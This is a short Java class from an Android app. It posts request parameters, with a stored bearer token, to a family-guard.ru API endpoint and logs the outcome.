package com.inet.android.request;

import org.apache.http.Header;
import org.apache.http.message.BasicHeader;

import android.content.Context;
import android.content.SharedPreferences;
import android.preference.PreferenceManager;

import com.inet.android.utils.Logging;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;
import com.loopj.android.http.SyncHttpClient;

public class FileCaller {
	private final static String LOG_TAG = FileCaller.class.getSimpleName()
			.toString();
	static int response = -1;

	public static void sendRequest(final RequestParams params,
			final Context mContext) {

		SyncHttpClient client = new SyncHttpClient();
		String URL = "http://family-guard.ru/api/informative";
		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(mContext);
		String token = sp.getString("access_second_token", "");
		final Header[] headers = {
				new BasicHeader("Accept", "application/json"),
				new BasicHeader("Authorization", "Bearer " + token) };
		Logging.doLog(LOG_TAG, "params: " + params.toString(), "params: "
				+ params.toString());
	

		client.post(mContext, URL, headers, params, null,
				new AsyncHttpResponseHandler() {
					@Override
					public void onStart() {
						// called before request is started
						Logging.doLog(LOG_TAG, "onStart. StartCode",
								"onStart. StartCode");

					}

					@Override
					public void onSuccess(int arg0, Header[] arg1, byte[] arg2) {
						Logging.doLog(LOG_TAG, "onSuccess. StatusCode: " + arg0
								+ arg1 + arg2, "onSuccess. StatusCode");
					}

					@Override
					public void onFailure(int arg0, Header[] arg1, byte[] arg2,
							Throwable arg3) {
						Logging.doLog(LOG_TAG, "onFailru. StatusCode" + arg0
								+ " " + arg3, "onFailru. StatusCode" + arg0
								+ " " + arg3);
						ParseToError.setError(arg0, params,
								ConstantValue.TYPE_FILE_REQUEST, mContext);
					}
				});
	}
}
